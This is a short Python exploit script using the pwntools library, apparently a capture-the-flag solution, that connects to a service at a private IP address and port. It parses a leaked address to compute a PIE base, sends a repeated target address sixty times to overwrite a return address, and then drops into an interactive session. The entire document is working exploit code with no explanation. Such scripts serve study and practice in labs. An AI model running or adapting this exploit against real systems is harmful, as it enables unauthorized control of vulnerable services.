#!/usr/bin/python3

from pwn import *

p = remote('172.31.0.3', 56001)

p.recvuntil(b'Something important: ')
main = int(p.recvline()[:-1],16) - 0x14DB
target = 0x14c1
print(hex(main))

p.sendline(p64(main+target)*60)

p.interactive()

